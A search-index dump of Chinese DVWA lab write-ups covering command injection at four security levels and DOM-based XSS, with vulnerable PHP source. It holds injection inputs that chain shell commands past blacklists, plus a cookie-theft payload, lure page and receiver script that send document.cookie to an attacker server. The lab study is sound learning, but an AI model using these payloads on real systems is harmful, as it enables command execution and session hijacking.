\u3002\u5230\u6b64\uff0c\u6211\u4eec\u5c31\u6210\u529f\u5730\u901a\u8fc7\u66b4\u529b\u65b9\u5f0f\u7834\u89e3\u4e86 DVWA Brute Force \u5b89\u5168\u7b49\u7ea7\u4e3a Low \u7684\u5bc6\u7801\u3002 \\text{Figure 20. Password}","title":"3.5. \u5f00\u59cb\u653b\u51fb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/1.DVWA_Brute_Force_Low/#4","text":"[1] \u5f90\u7131, \u674e\u6587\u8f69, \u738b\u4e1c\u4e9a. Web \u5b89\u5168\u653b\u9632:\u6e17\u900f\u6d4b\u8bd5\u5b9e\u6218\u6307\u5357 [M]. \u5317\u4eac: \u7535\u5b50\u5de5\u4e1a\u51fa\u7248\u793e, 2018. \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/","text":"DVWA Command Injection All # \u76ee\u5f55 # DVWA Command Injection All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 3. \u547d\u4ee4\u884c\u6ce8\u5165 3.1. Low 3.2. Medium 3.3. High 3.4. Impossible 1. \u80cc\u666f # \u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684\u547d\u4ee4\u884c\u6ce8\u5165\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 2. \u73af\u5883\u642d\u5efa # \u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002 3. \u547d\u4ee4\u884c\u6ce8\u5165 # 3.1. Low # \\text{Figure 1. Command Injection} \u5148\u4ece Low \u96be\u5ea6\u5f00\u59cb\uff0c\u6211\u4eec\u53c2\u8003\u4e00\u4e0b\u6e90\u7801\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u6ca1\u6709\u5bf9\u6211\u4eec\u7684\u8f93\u5165\u505a\u4efb\u4f55\u7684\u9650\u5236\uff0c\u6211\u4eec\u8f93\u5165\u7684\u547d\u4ee4\u4f1a\u88ab\u62fc\u63a5\u5728 ping \u547d\u4ee4\u7684\u540e\u9762\uff0c\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u6267\u884c\uff0c\u5e76\u8fd4\u56de\u8f93\u51fa\u3002 \u4e8e\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 && \u547d\u4ee4\u62fc\u63a5\u6211\u4eec\u60f3\u8ba9\u670d\u52a1\u5668\u6267\u884c\u7684\u547d\u4ee4\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u4e3a\u6240\u6b32\u4e3a\u3002 \u6bd4\u5982\u62fc\u63a5 ls \u547d\u4ee4\u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 localhost && ls \\text{Figure 2. Low} \u8f93\u51fa\u6709\u4e00\u70b9\u4e71\uff0c\u6211\u4eec\u53ef\u4ee5\u628a ping \u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230 temp.txt \u6587\u4ef6\u4e2d\u3002 localhost > temp.txt && ls \\text{Figure 3. Redirect Output} \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u524d\u76ee\u5f55\u4e0b\u67094\u4e2a\u6587\u4ef6\uff0c\u4e00\u4e2a\u662f\u6211\u4eec\u521a\u521b\u5efa\u7684 temp.txt \u3002 help index.php source temp.txt \u5982\u679c\u8fd9\u662f\u4e00\u573a CTF \u593a\u65d7\u8d5b\u7684\u8bdd\uff0c flag \u5e94\u8be5\u5c31\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7 cat \u547d\u4ee4\u83b7\u53d6\u5bc6\u94a5\u4e86\u3002 3.2. Medium # \u63a5\u4e0b\u6765\u662f Medium \u96be\u5ea6\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&&' => '', ';' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u4ece\u6e90\u7801\u4e2d\u6211\u4eec\u53d1\u73b0\u4ee3\u7801\u4e2d\u591a\u4e86\u4e24\u4e2a\u66ff\u6362\u89c4\u5219\uff0c\u5efa\u7acb\u4e86\u8f93\u5165\u7684\u9ed1\u540d\u5355\u3002 // Set blacklist $substitutions = array( '&&' => '', ';' => '', ); \u4f46\u662f\uff0c\u8fd9\u4e2a\u9ed1\u540d\u5355\u975e\u5e38\u5f97\u8106\u5f31\uff0c\u6211\u4eec\u53ea\u8981\u628a && \u6362\u6210 & \u547d\u4ee4\u5c31\u80fd\u7ed5\u5f00\u9ed1\u540d\u5355\u4e86\u3002 && \u548c & \u90fd\u80fd\u8d77\u5230\u547d\u4ee4\u62fc\u63a5\u7684\u4f5c\u7528\uff0c a && b \u5728 a \u547d\u4ee4\u6267\u884c\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u6267\u884c b \u547d\u4ee4\uff0c a & b \u5219\u65e0\u8bba a \u662f\u5426\u6267\u884c\u6210\u529f\u90fd\u4f1a\u6267\u884c b \u3002 localhost > temp.txt & ls \\text{Figure 4. Medium} 3.3. High # \u63a5\u4e0b\u6765\u5c31\u662f High \u96be\u5ea6\u4e86\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> High \u96be\u5ea6\u7684\u9ed1\u540d\u5355\u66f4\u52a0\u5b8c\u5584\u4e86\uff0c & \u547d\u4ee4\u4e5f\u88ab\u66ff\u6362\u6389\u4e86\u3002\u903b\u8f91\u4e0a\u597d\u50cf\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46\u662f\u4ed4\u7ec6\u770b\u7684\u8bdd\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u66ff\u6362\u89c4\u5219\u4e2d\u7684\u4e00\u4e2a\u6f0f\u6d1e\uff0c '\uff5c ' \u53f3\u8fb9\u591a\u4e86\u4e00\u4e2a\u7a7a\u683c\uff0c\u8fd9\u5c31\u7ed9\u4e86\u6211\u4eec\u673a\u4f1a\u4e86\u3002 // Set blacklist $substitutions = array( '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); a | b \u8868\u793a\u5c06 a \u547d\u4ee4\u7684\u8f93\u51fa\u4f5c\u4e3a b \u547d\u4ee4\u7684\u8f93\u5165\u3002\u5982\u679c b \u547d\u4ee4\u4e0d\u63a5\u53d7\u8f93\u5165\u7684\u8bdd\uff0c\u53ef\u4ee5\u53ef\u4ee5\u5f53\u4f5c\u8fde\u63a5\u7b26\u53f7\u4f7f\u7528\u3002 localhost > temp.txt |ls \\text{Figure 5. High} 3.4. Impossible # Impossible \u96be\u5ea6\u4f7f\u7528\u4e86\u767d\u540d\u5355\uff0c\u8981\u6c42\u8f93\u5165\u4e3a xxx.xxx.xxx.xxx \u7684\u683c\u5f0f\uff0c xxx \u8fd8\u8981\u6c42\u662f\u6570\u5b57\uff0c\u57fa\u672c\u4e0a\u5c31\u6ca1\u6709\u4ec0\u4e48\u5b89\u5168\u6f0f\u6d1e\u4e86\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( \".\", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } else { // Ops. Let the user name theres a mistake echo '<pre>ERROR: You have entered an invalid IP.</pre>'; } } // Generate Anti-CSRF token generateSessionToken(); ?> \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.DVWA Command Injection All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#dvwa-command-injection-all","text":"","title":"DVWA Command Injection All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#_1","text":"DVWA Command Injection All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 3. \u547d\u4ee4\u884c\u6ce8\u5165 3.1. Low 3.2. Medium 3.3. High 3.4. Impossible","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#1","text":"\u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684\u547d\u4ee4\u884c\u6ce8\u5165\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#2","text":"\u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002","title":"2. \u73af\u5883\u642d\u5efa"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#3","text":"","title":"3. \u547d\u4ee4\u884c\u6ce8\u5165"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#31-low","text":"\\text{Figure 1. Command Injection} \u5148\u4ece Low \u96be\u5ea6\u5f00\u59cb\uff0c\u6211\u4eec\u53c2\u8003\u4e00\u4e0b\u6e90\u7801\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u6ca1\u6709\u5bf9\u6211\u4eec\u7684\u8f93\u5165\u505a\u4efb\u4f55\u7684\u9650\u5236\uff0c\u6211\u4eec\u8f93\u5165\u7684\u547d\u4ee4\u4f1a\u88ab\u62fc\u63a5\u5728 ping \u547d\u4ee4\u7684\u540e\u9762\uff0c\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u6267\u884c\uff0c\u5e76\u8fd4\u56de\u8f93\u51fa\u3002 \u4e8e\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 && \u547d\u4ee4\u62fc\u63a5\u6211\u4eec\u60f3\u8ba9\u670d\u52a1\u5668\u6267\u884c\u7684\u547d\u4ee4\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u4e3a\u6240\u6b32\u4e3a\u3002 \u6bd4\u5982\u62fc\u63a5 ls \u547d\u4ee4\u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 localhost && ls \\text{Figure 2. Low} \u8f93\u51fa\u6709\u4e00\u70b9\u4e71\uff0c\u6211\u4eec\u53ef\u4ee5\u628a ping \u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230 temp.txt \u6587\u4ef6\u4e2d\u3002 localhost > temp.txt && ls \\text{Figure 3. Redirect Output} \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u524d\u76ee\u5f55\u4e0b\u67094\u4e2a\u6587\u4ef6\uff0c\u4e00\u4e2a\u662f\u6211\u4eec\u521a\u521b\u5efa\u7684 temp.txt \u3002 help index.php source temp.txt \u5982\u679c\u8fd9\u662f\u4e00\u573a CTF \u593a\u65d7\u8d5b\u7684\u8bdd\uff0c flag \u5e94\u8be5\u5c31\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7 cat \u547d\u4ee4\u83b7\u53d6\u5bc6\u94a5\u4e86\u3002","title":"3.1. Low"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#32-medium","text":"\u63a5\u4e0b\u6765\u662f Medium \u96be\u5ea6\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&&' => '', ';' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u4ece\u6e90\u7801\u4e2d\u6211\u4eec\u53d1\u73b0\u4ee3\u7801\u4e2d\u591a\u4e86\u4e24\u4e2a\u66ff\u6362\u89c4\u5219\uff0c\u5efa\u7acb\u4e86\u8f93\u5165\u7684\u9ed1\u540d\u5355\u3002 // Set blacklist $substitutions = array( '&&' => '', ';' => '', ); \u4f46\u662f\uff0c\u8fd9\u4e2a\u9ed1\u540d\u5355\u975e\u5e38\u5f97\u8106\u5f31\uff0c\u6211\u4eec\u53ea\u8981\u628a && \u6362\u6210 & \u547d\u4ee4\u5c31\u80fd\u7ed5\u5f00\u9ed1\u540d\u5355\u4e86\u3002 && \u548c & \u90fd\u80fd\u8d77\u5230\u547d\u4ee4\u62fc\u63a5\u7684\u4f5c\u7528\uff0c a && b \u5728 a \u547d\u4ee4\u6267\u884c\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u6267\u884c b \u547d\u4ee4\uff0c a & b \u5219\u65e0\u8bba a \u662f\u5426\u6267\u884c\u6210\u529f\u90fd\u4f1a\u6267\u884c b \u3002 localhost > temp.txt & ls \\text{Figure 4. Medium}","title":"3.2. Medium"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#33-high","text":"\u63a5\u4e0b\u6765\u5c31\u662f High \u96be\u5ea6\u4e86\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> High \u96be\u5ea6\u7684\u9ed1\u540d\u5355\u66f4\u52a0\u5b8c\u5584\u4e86\uff0c & \u547d\u4ee4\u4e5f\u88ab\u66ff\u6362\u6389\u4e86\u3002\u903b\u8f91\u4e0a\u597d\u50cf\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46\u662f\u4ed4\u7ec6\u770b\u7684\u8bdd\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u66ff\u6362\u89c4\u5219\u4e2d\u7684\u4e00\u4e2a\u6f0f\u6d1e\uff0c '\uff5c ' \u53f3\u8fb9\u591a\u4e86\u4e00\u4e2a\u7a7a\u683c\uff0c\u8fd9\u5c31\u7ed9\u4e86\u6211\u4eec\u673a\u4f1a\u4e86\u3002 // Set blacklist $substitutions = array( '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); a | b \u8868\u793a\u5c06 a \u547d\u4ee4\u7684\u8f93\u51fa\u4f5c\u4e3a b \u547d\u4ee4\u7684\u8f93\u5165\u3002\u5982\u679c b \u547d\u4ee4\u4e0d\u63a5\u53d7\u8f93\u5165\u7684\u8bdd\uff0c\u53ef\u4ee5\u53ef\u4ee5\u5f53\u4f5c\u8fde\u63a5\u7b26\u53f7\u4f7f\u7528\u3002 localhost > temp.txt |ls \\text{Figure 5. High}","title":"3.3. High"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/2.DVWA_Command_Injection_All/#34-impossible","text":"Impossible \u96be\u5ea6\u4f7f\u7528\u4e86\u767d\u540d\u5355\uff0c\u8981\u6c42\u8f93\u5165\u4e3a xxx.xxx.xxx.xxx \u7684\u683c\u5f0f\uff0c xxx \u8fd8\u8981\u6c42\u662f\u6570\u5b57\uff0c\u57fa\u672c\u4e0a\u5c31\u6ca1\u6709\u4ec0\u4e48\u5b89\u5168\u6f0f\u6d1e\u4e86\u3002 <?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( \".\", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } else { // Ops. Let the user name theres a mistake echo '<pre>ERROR: You have entered an invalid IP.</pre>'; } } // Generate Anti-CSRF token generateSessionToken(); ?> \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.4. Impossible"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/3.DVWA_XSS_DOM_All/","text":"DVWA XSS DOM All # \u76ee\u5f55 # DVWA XSS DOM All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 3. \u8de8\u7ad9\u811a\u672c\u653b\u51fb 3.1. Low 3.2. Medium 3.3. High 3.3. Impossible 1. \u80cc\u666f # \u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 2. \u73af\u5883\u642d\u5efa # \u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002 3. \u8de8\u7ad9\u811a\u672c\u653b\u51fb # 3.1. Low # \\text{Figure 1. XSS DOM} \u5148\u4ece Low \u96be\u5ea6\u5f00\u59cb\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0b\u62c9\u9009\u62e9\u6846\uff0c\u6211\u4eec\u5148\u770b\u4e00\u770b\u6784\u6210\u9009\u9879\u7684 Javascript \u4ee3\u7801\uff0c\u8fd9\u91cc\u4f1a\u5c06URL\u4e2d\u7684 default \u5173\u952e\u5b57\u7684\u503c\u62fc\u63a5\u5230 HTML \u4e2d\u3002 if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\") + 8); document.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\"); document.write(\"<option value='' disabled='disabled'>----</option>\"); } document.write(\"<option value='English'>English</option>\"); document.write(\"<option value='French'>French</option>\"); document.write(\"<option value='Spanish'>Spanish</option>\"); document.write(\"<option value='German'>German</option>\"); \u518d\u770b\u4e00\u770b\u670d\u52a1\u7aef\u7684\u4ee3\u7801\uff0c Low \u96be\u5ea6\u6ca1\u6709\u5bf9 URL \u8fdb\u884c\u4efb\u4f55\u63a7\u5236\u3002 <?php # No protections, anything goes ?> \u6bd4\u5982\u6211\u4eec\u60f3\u8981\u7a83\u53d6\u522b\u4eba\u7684 Cookie \u7684\u8bdd\uff0c\u53ea\u9700\u8981\u8bf1\u5bfc\u4ed6\u70b9\u51fb\u4e0b\u9762\u7684\u94fe\u63a5\u3002 http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script> \\text{Figure 2. Cookie} \u5f53\u7136\uff0c\u8fd9\u4e2a\u94fe\u63a5\u592a\u660e\u663e\u4e86\uff0c\u522b\u4eba\u4e0d\u4e00\u5b9a\u4f1a\u70b9\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e0a\u6302\u4e00\u4e2a\u7f51\u9875\uff0c\u4ece\u7f51\u9875\u8f6c\u5230\u8fd9\u4e2a\u94fe\u63a5\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u4eec\u4ec5\u5728\u672c\u5730\u8c03\u8bd5\uff0c\u6211\u4eec\u5728\u672c\u5730 8888 \u7aef\u53e3\u6302\u4e00\u4e2a hack.js \u6587\u4ef6\uff0c\u8fd9\u91cc\u7684\u547d\u4ee4\u5c06\u4f1a\u628a Cookie \u53d1\u9001\u5230 hack \u63a5\u53e3\u3002 window.location.href = \"http://localhost:8888/hack?cookie=\" + document.cookie; \u518d\u6784\u9020\u4e00\u4e2a\u8df3\u8f6c\u9875\u9762\u4f5c\u4e3a index.html \u3002 <!DOCTYPE html> <html lang=\"zh\"> <head> <meta charset=\"UTF-8\"> <style> div { text-align: center; } </style> </head> <body> <div> <p> \u9875\u9762\u8df3\u8f6c\u4e2d\uff0c\u8bf7\u7a0d\u5019\u3002\u3002\u3002 </p> <script src=\"transfer.js\"> </script> </div> </body> </html> \u4e0b\u9762\u662f\u9875\u9762\u4e2d\u6267\u884c\u7684 transfer.js \u6587\u4ef6\uff0c\u5b83\u5c06\u5f53\u524d\u9875\u9762\u8df3\u8f6c\u5230XSS\uff0c\u7136\u540e\u6267\u884c hack.js \uff0c\u628a cookie \u53d1\u9001\u5230\u4e86 hack \u7aef\u53e3\u3002 window.location.href = \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:10278/web/vulnerabilities/xss_d/?default=English<script src=http://localhost:8888/hack.js>\\</script>\"; \u670d\u52a1\u7aef\u4ee5 Express \u4e3a\u4f8b\uff0c hack \u7aef\u53e3\u8f93\u51fa\u4e86\u4f20\u5165\u7684 cookie \uff0c\u5e76\u5c06\u9875\u9762\u518d\u91cd\u5b9a\u5411\u5230 www.baidu.com \u3002 Express \u7684\u5177\u4f53\u914d\u7f6e\u53ef\u4ee5\u53c2\u8003 \u53e6\u4e00\u7bc7\u535a\u5ba2 \u3002 var app = express(); app.get('/hack', function (req, res, next) { console.log(\"-----------------\"); 